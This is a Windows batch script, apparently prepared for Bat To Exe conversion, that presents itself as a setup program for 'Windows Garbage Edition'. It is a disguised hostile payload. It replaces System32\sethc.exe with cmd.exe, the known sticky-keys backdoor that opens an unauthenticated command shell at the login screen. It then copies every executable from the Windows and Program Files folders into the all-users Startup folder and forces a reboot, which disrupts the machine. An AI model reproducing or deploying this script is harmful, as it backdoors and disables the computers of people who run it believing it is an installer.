::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAjk
::fBw5plQjdCyDJGyX8VAjFBBRWg2MAFuzBaEJ+u3o092OrEkSQ/FnNobY1dQ=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSjk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+IeA==
::cxY6rQJ7JhzQF1fEqQJhZksaHErSXA==
::ZQ05rAF9IBncCkqN+0xwdVsFAlTMbCXqZg==
::ZQ05rAF9IAHYFVzEqQIHIRVQQxORfEy7FLcd7+27yu6OtkQSWoI=
::eg0/rx1wNQPfEVWB+kM9LVsJDDOrEkybNJc9z83ey8Ozi2Iza9ppLMH+4pHu
::fBEirQZwNQPfEVWB+kM9LVsJDDOLMmy7FLcd7+3+6+OTq0ITa/ppLMH+wrHu
::cRolqwZ3JBvQF1fEqQIHIRVQQxORfEy7FLcd7+27yu6OtkQSWqJpLML506DOM+UH/1WE
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFBBRWg2MAE+1BaAR7ebv/Naqo0EKVfA6RJjS1LOPMuIS7UDhcZ8533VUp9NaWFVdZhfL
::YB416Ek+ZW8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
title Windows Garbage Edition x64 Setup
msg * Are you sure you want to install Windows Garbage Edition? It is recommended if you use Windows 8.1 or higher, 64-bit OS and x64 based processor. Continue?
@pause
cd C:\Windows\System32
del sethc.exe
copy cmd.exe sethc.exe
msg * To add a user, press shift 5 times then type in net user add [username].
@pause
cd C:\
cd Windows
copy *.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
cd ..
cd C:\
cd "Program Files"
copy *.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
cd ..
cd C:\
cd "Program Files (x86)"
copy *.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
msg * Installation done, setup will restart your computer in 30 seconds. Save your work, close all apps and wait.
shutdown -r -t 30

